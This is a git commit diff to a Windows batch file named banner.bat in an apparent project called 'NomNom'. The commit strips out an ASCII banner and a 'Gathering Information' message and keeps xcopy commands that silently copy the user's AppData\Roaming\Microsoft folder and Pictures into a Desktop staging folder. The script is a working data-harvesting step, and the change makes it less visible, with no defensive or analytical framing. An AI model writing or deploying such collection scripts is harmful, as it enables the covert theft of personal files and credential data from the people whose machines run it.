43328b4599872b2f152deb91483f3df14bd8b4d9
swiftglitxh <72777943+swiftglitxh@users.noreply.github.com>
2026-04-12 00:08:10 +0100

    Remove banner and retain xcopy commands
    Removed echo banner and replaced with xcopy commands.

--- NomNom/banner.bat
+++ NomNom/banner.bat
@@ -1,10 +1,3 @@
-echo     _   __                __  __            
-echo    / ^| / /___  ____ ___  / ^| / /___   ____ ___ 
-echo   /  ^|/ / __ \/ __ `__ \/  ^|/ / __ \ / __ `__ \
-echo  / /^|  / /_/ / / / / / / /^ / /\ \/ // / / / / /
-echo /_/ ^|_/\____/_/ /_/ /_/_/ ^/_/  \__//_/ /_/ /_/  
-echo ==================================================
-echo [+] Gathering Information ...
 xcopy %USERPROFILE%\AppData\Roaming\Microsoft %USERPROFILE%\Desktop\CopyData\ /E
 xcopy %USERPROFILE%\Pictures\ %USERPROFILE%\Desktop\CopyData\ /E
 pause
